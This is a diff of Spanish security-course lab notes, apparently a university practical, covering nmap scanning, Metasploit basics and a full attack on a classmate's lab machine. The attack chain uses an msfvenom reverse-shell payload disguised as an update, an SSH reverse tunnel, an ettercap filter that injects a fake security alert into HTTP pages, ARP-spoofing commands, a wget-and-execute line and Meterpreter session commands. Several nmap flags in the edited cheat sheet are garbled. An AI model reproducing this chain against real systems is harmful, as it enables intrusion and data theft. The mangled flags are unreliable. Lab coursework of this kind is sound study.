@@ -325,25 +325,26 @@ etterfilter input.ef -o out.ef   # compilar filtro antes de usarlo.
 2- NMAP: Sirve para escanear redes y descubrir hosts, puertos y servicios.
 
 # Puertos
-- `-p` : Define puertos específicos a escanear.  
-- `-p-` : Escanea todos los puertos posibles (0-65535).  
+-p : Define puertos específicos a escanear.  
+- p : Escanea todos los puertos posibles (0-65535).  
 
 # Escaneo de hosts
-- `-sP` : Detecta hosts activos en una red sin escanear puertos.  
-- `-Pn` : No realiza ping previo; asume que el host está activo.  
+-sP : Detecta hosts activos en una red sin escanear puertos.
+-sL: NO escanea puertos, ni hace ping a los equipos, solo lista las IPs/hosts que serían escaneadas-
+- Pn : No realiza ping previo; asume que el host está activo.  
 
 # Velocidad y control
-- `-T0` a `-T5` : Controla velocidad del escaneo (T0 muy lento y sigiloso, T5 muy rápido).  
+-T0 a T5: Controla velocidad del escaneo (T0 muy lento y sigiloso, T5 muy rápido).  
 
 # Detección de servicios y sistema operativo
-- `-A` : Escaneo completo (OS, servicios, versiones, scripts y traceroute).  
-- `-O` : Detecta el sistema operativo del host.  
-- `-sV` : Detecta servicios y sus versiones.  
+- A: Escaneo completo (OS, servicios, versiones, scripts y traceroute).  
+-O: Detecta el sistema operativo del host.  
+-sV: Detecta servicios y sus versiones.  
 
 # Tipos de escaneo
-- `-sS` : SYN scan (semi-abierto, rápido y menos detectable).  
-- `-sT` : TCP connect scan (completo, más detectable).  
-- `-sU` : Escaneo de puertos UDP.  
+-sS: SYN scan (semi-abierto, rápido y menos detectable).  
+-sT: TCP connect scan (completo, más detectable).  
+-sU: Escaneo de puertos UDP.  
 
 # Verbosidad y depuración
 - `-v` : Modo verbose, muestra información detallada.  
@@ -355,30 +356,30 @@ etterfilter input.ef -o out.ef   # compilar filtro antes de usarlo.
 - `--reason` : Explica por qué un puerto está abierto, cerrado o filtrado.  
 
 # Scripts NSE
-- `--script` : Ejecuta scripts NSE para detección avanzada y auditorías.  
-- `--script=<script>` : Ejecuta un script específico.  
-- `--script-args` : Pasa argumentos a los scripts NSE.  
-- `--script-help` : Muestra ayuda sobre los scripts disponibles.  
+- --script: Ejecuta scripts NSE para detección avanzada y auditorías.  
+- --script=<script>: Ejecuta un script específico.  
+- --script-args: Pasa argumentos a los scripts NSE.  
+- --script-help: Muestra ayuda sobre los scripts disponibles.  
 
 # Otras opciones útiles
-- `--traceroute` : Realiza un traceroute hacia el host.  
-- `-6` : Habilita escaneo IPv6.  
-- `-n` : No resuelve nombres DNS, usa solo IPs.  
+- --traceroute: Realiza un traceroute hacia el host.  
+- 6: Habilita escaneo IPv6.  
+-N : No resuelve nombres DNS, usa solo IPs.  
 - `-R` : Fuerza resolución DNS.  
-- `--max-retries` : Número máximo de reintentos por host.  
-- `--host-timeout` : Tiempo máximo permitido por host.  
-- `--max-rate` : Limita la velocidad máxima de paquetes por segundo.  
-- `--min-rate` : Define velocidad mínima de paquetes.  
+- --max-retries: Número máximo de reintentos por host.  
+- --host-timeout : Tiempo máximo permitido por host.  
+- --max-rate : Limita la velocidad máxima de paquetes por segundo.  
+- --min-rate : Define velocidad mínima de paquetes.  
 
 # Salida de resultados
-- `-oN` : Guarda salida en formato normal.  
-- `-oX` : Guarda salida en formato XML.  
-- `-oG` : Guarda salida en formato grepable.  
-- `-oA` : Guarda salida en todos los formatos anteriores.  
-- `--packet-trace` : Muestra todos los paquetes enviados y recibidos.  
-- `--iflist` : Lista interfaces de red disponibles y rutas.  
-- `--version-all` : Detección de versión exhaustiva.  
-- `--version-light` : Detección de versión rápida.  
+-oN : Guarda salida en formato normal.  
+-oX : Guarda salida en formato XML.  
+- o : Guarda salida en formato grepable.  
+- oA : Guarda salida en todos los formatos anteriores.  
+- --packet-trace : Muestra todos los paquetes enviados y recibidos.  
+- --iflist : Lista interfaces de red disponibles y rutas.  
+- --version-all : Detección de versión exhaustiva.  
+- --version-light : Detección de versión rápida.  
 
 
 
@@ -395,7 +396,24 @@ etterfilter input.ef -o out.ef   # compilar filtro antes de usarlo.
 
 
 4-METASPLOIT:
-#
+# Inicio
+msfconsole        # Arranque de metasploit
+mfsupdate         # Actualizar metasploit
+
+
+# Búsquedas e información
+search nombre
+search type:exploit apache
+search cve:2021
+info
+
+# Uso de exploits
+use exploit/ruta/del/exploit
+
+# Payloads
+show payloads                      # Listar payloads
+set PAYLOAD nombre_del_payload     # Seleccionar payload
+run                                # Ejecutar payload
 
 
 # Meterpreter
@@ -903,26 +921,63 @@ Creamos una ventanita en la que la víctima tiene que entrar. Va abrir un html n
 <br>
 
 **PASOS**:
+1-Creamos un túnel:
+```
+ssh -R 4444:localhost:4444 lsi@10.11.48.175
+```
+Crea un "puente secreto" entre tu máquina y la de tu compañero.
 
-1-Creamos payload:
+    En la víctima: Abre el puerto 4444
+
+    En tu máquina: Recibe las conexiones del puerto 4444 de la víctima
+
+    El payload se conecta a 127.0.0.1:4444 (local en la víctima)
+
+    El túnel redirige esa conexión a tu Metasploit
+
+Con esto no necesitaremos más adelante que la víctima acepte permisos.
+
+2-Creamos payload:
 ```bash
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.11.48.202 LPORT=4444 -f elf > actualizacion.bin
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > actualizacion.bin
 ```
 
-2-Permisos
+Si usamos el túnel a Ip debe ser 127.0.0.1. Si no usamos debe ser la nuestra: 10.11.48.202
+
+msfvenom es la herramienta de metaspolit que genera payloads.
+- [p] indica el tipo de payload que se generará (en este caso un reverse tcp, lo que significa que el payload abrirá una conexión TCP inversa en el host especificado).
+
+- [LHOST] indica el host donde se generará la conexion (ip del atacante).
+
+- [LPORT] indica el puerto donde se generará (puerto que le metimos al metasploit).
+
+- [-f] indica el formato de salida del payload (en este caso .elf).
+
+- [> actualizacion.bin] esta parte redirige la salida del comando al archivo "actualizacion.bin".
+
+<br>
+
+3-Permisos
 ```bash
 chmod +x actualizacion.bin
 ```
 
+Convierte el archivo en un programa que puede ejecutarse en Linux.
 
-3-Subir el payload a Internet:
+<br>
+
+
+4-Subir el payload y el script a Internet:
 ```bash
 curl -F "file=@actualizacion.bin" https://tmpfiles.org/api/v1/upload
 ```
 o manualmente en  tmpfiles.org
 
+**Los archivos en tmpfiles.org expiran en 1 hora** -> subirlos antes de hacer el ataque. Verificar que el enlace funciona.
 
-4-Crear el filtro ettercap:
+Cada vez que tengamos una URL nuevo tenemos que cambiarla abajo en el filtro (SIGUIENTE PASO).
+
+5-Crear el filtro ettercap:
 ```html:
 if (ip.proto == TCP && tcp.dst == 80) {
     if (search(DATA.data, "Accept-Encoding")) {
@@ -932,47 +987,83 @@ if (ip.proto == TCP && tcp.dst == 80) {
 }
 
 if (ip.proto == TCP && tcp.src == 80) {
-    replace("</body>", "</body><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;'><h2>⚠️ ALERTA DE SEGURIDAD</h2><p><b>Actualización crítica requerida:</b> Ejecute este parche inmediatamente</p><a href='http://tmpfiles.org/5766984/actualizacion.bin' style='background:white;color:red;padding:10px;text-decoration:none;font-weight:bold;margin:10px;display:inline-block;'>🔒 DESCARGAR PARCHE</a><p style='font-size:12px;'>Después: chmod +x actualizacion.bin && ./actualizacion.bin</p></div>");
-    replace("</BODY>", "</BODY><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;'><h2>⚠️ ALERTA DE SEGURIDAD</h2><p><b>Actualización crítica requerida:</b> Ejecute este parche inmediatamente</p><a href='http://tmpfiles.org/5766984/actualizacion.bin' style='background:white;color:red;padding:10px;text-decoration:none;font-weight:bold;margin:10px;display:inline-block;'>🔒 DESCARGAR PARCHE</a><p style='font-size:12px;'>Después: chmod +x actualizacion.bin && ./actualizacion.bin</p></div>");
+    replace("</body>", "</body><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;'><h2>⚠️ ALERTA DE SEGURIDAD</h2><p><b>Actualizacion critica requerida:</b> Ejecute este parche inmediatamente</p><a href='http://tmpfiles.org/5766984/actualizacion.bin' style='background:white;color:red;padding:10px;text-decoration:none;font-weight:bold;margin:10px;display:inline-block;'>🔒 DESCARGAR PARCHE</a><p style='font-size:12px;'>Despues: chmod +x actualizacion.bin && ./actualizacion.bin</p></div>");
+    replace("</BODY>", "</BODY><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;'><h2>⚠️ ALERTA DE SEGURIDAD</h2><p><b>Actualizacion critica requerida:</b> Ejecute este parche inmediatamente</p><a href='http://tmpfiles.org/5766984/actualizacion.bin' style='background:white;color:red;padding:10px;text-decoration:none;font-weight:bold;margin:10px;display:inline-block;'>🔒 DESCARGAR PARCHE</a><p style='font-size:12px;'>Despues: chmod +x actualizacion.bin && ./actualizacion.bin</p></div>");
 }
 ```
 
-5-Compilarlo:
+Pone tu archivo en internet para que tu compañero lo pueda descargar. Además todo el tráfico que genere desde un navegador se le redirigirá a esta página.
+
+Esta página usa Ingeniería Social, le sale a la víctima en cualquier página que entre y le indica que hay una actualización pendiente en su navegador y que debe descargarla.
+
+<br>
+
+6-Compilarlo:
 ```bash
 etterfilter filtro.filter -o filtro.ef
 ```
+Es unha herramienta de ettercap que procesa archivos de filtro (los archivos de filtro se procesan para aplicar reglas específicas a los datos o al tráfico que se está filtrando).
+
+ [-o] -> especifica el nombre del archivo de salida que se generará
+
+<br>
 
 6-Permite que el tráfico pase a través de tu máquina (importante para el ataque Man-in-the-Middle).
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
+Habilitamos la opcion de reenvios de paquetes IP. 
+
+<br>
+
 **ATAQUE**:
 En una terminal:
 
-7-Ejecutar Ettercap
+7-Ejecutar Ettercap para esnifar la paquetería de la víctima:
 ```bash
-ettercap -T -i eth0 -M arp:remote /10.11.48.175/ /10.11.48.1/ -F filtro.ef
+ettercap -T -i ens33 -M arp:remote /10.11.48.175// /10.11.48.1// -F filtro.ef
 ```
+
+[-F] carga el filtro compilado
+
 
 En otra terminal:
 
 8-Abrir metasploit:
+
+- Si usamos el túnel:
 ```bash
 msfconsole
 use exploit/multi/handler
 set payload linux/x64/meterpreter/reverse_tcp
-set LHOST 192.168.1.10  # Tu IP
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit
+```
+
+- Si no usamos túnel:
+```bash
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 10.11.48.202 
 set LPORT 4444
 exploit
 ```
 
 
-Si ahora la víctima ejecuta cualquier página con w3m le redirige a mi página.
+Si ahora la víctima ejecuta cualquier página con w3m le redirige a mi página. Tendrá que descargar el archivo que le pone ahí y ejecutarlo y mientras estamos con exploit en metasploit se nos abrirá meterpreter.
+```bash
+meterpreter>
+```
 
-Tendrá que descargar el archivo que le pone ahí y ejecutarlo y mientras estamos con exploit en metasploit se nos abrirá meterpreter.
+Para descargar basta con clicar en el enlace o hacer:
+```bash
+wget -q -O actualizacion.bin http://tmpfiles.org/5766984/actualizacion.bin && ./actualizacion.bin
+```
 
-!!Estamos dentro de la máquina del compañero!!
+**!!Estamos dentro de la máquina del compañero!!**
 
 Comando de metasploit:
 ```bash
@@ -988,6 +1079,10 @@ upload /ruta/local/file.txt   # Subir archivo a la víctima
 download file.txt /ruta/local # Descargar archivo de la víctima
 shell            # Acceder a la terminal normal de la víctima
 ```
+
+#### RESUMEN FÁCIL:
+
+TÚNEL SSH ←→ PAYLOAD LOCAL ←→ VÍCTIMA ←→ ETTERCAP ←→ METASPLOIT
 
 
 
@@ -1009,14 +1104,106 @@ shell            # Acceder a la terminal normal de la víctima
 
 ### **Apartado h) Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4?.**
 
+**NADA de IPv6**
 
-NADA de IPv6.
+De las que están activas cuales son sus MAC etc. Si ponemos toda la red, petamos el sistema!!!
 
-De las que están activas cuales son sus MAC etc
-
-Si ponemos toda la red, petamos el sistema!!!
 Poner solo una red pequeña o solo al compañero y la puerta del enlace por ejemplo. Probar también todo el 48 (más riesgo).
 
+
+- Host discovery: descubrir equipos en la red local
+
+```bash
+nmap -sL 10.11.48.0/23
+nmap -sP 10.11.48.0/23
+```
+
+- [-sL]: NO escanea puertos y NO hace ping a los equipos. SOLO lista las IPs/hosts que serían escaneadas
+- [-sP]: No escanea puertos, solo dice que equipos están activos. Es lo mismo que -sn
+
+
+<br>
+
+- Port scanning (escaneo de puertos)
+  
+Podemos hacer escaneo de puertos de todos los equipos de /48 o solo de mi compañero. Usaremos nmap para descubrir que puertos están abiertos.
+
+En mi caso voy a probar solo con mi compañero:
+
+```bash
+nmap -sS 10.11.48.175
+```
+
+- [-sS]: escaneo SYN rápido y sigiloso
+
+Salida:
+```bash
+root@ismael:~# nmap -sS 10.11.48.175
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-30 12:35 CET
+Nmap scan report for 10.11.48.175
+Host is up (0.00026s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+514/tcp open  shell
+MAC Address: 00:50:56:97:29:8B (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
+```
+
+Aquí vemos que mi comapñero tiene los puertos 22 (ssh) y el 514 (tcp) abiertos.
+<br>
+
+Escaneo completo TCP:
+```bash
+nmap -sT -p- 10.11.48.175
+```
+
+La salida es igual que la anterior.
+
+Con -p podemos especificar los puertos que queremos comprobar si están o no abiertos.
+
+<br>
+
+- OS fingerprinting (detección de Sistema Operativo)
+```bash
+nmap -O 10.11.48.175
+```
+
+Salida:
+```bash
+root@ismael:~# nmap -O 10.11.48.175
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-30 12:48 CET
+Nmap scan report for 10.11.48.175
+Host is up (0.00041s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+514/tcp open  shell
+MAC Address: 00:50:56:97:29:8B (VMware)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
+```
+Si la máquina está apagada o bloqueando ICMP esto no funciona.
+
+Escaneo completo con OS detection:
+```bash
+nmap -A 10.11.48.175
+```
+
+<br>
+
+#### RESUMEN FÁCIL:
+
+- Host discovery: nmap -sL 10.11.48.1/23.
+- Port scanning: nmap -sS IP COMPAÑERO.
+- OS fingerprinting: nmap -O IP COMPAÑERO.
 
 <br>
 <br>
@@ -1164,6 +1351,7 @@ Una vez que OSSEC funciona, hacer un flush de OSSEC y veremos todo en pantalla. 
 
 
 <br>
+
 
 
 
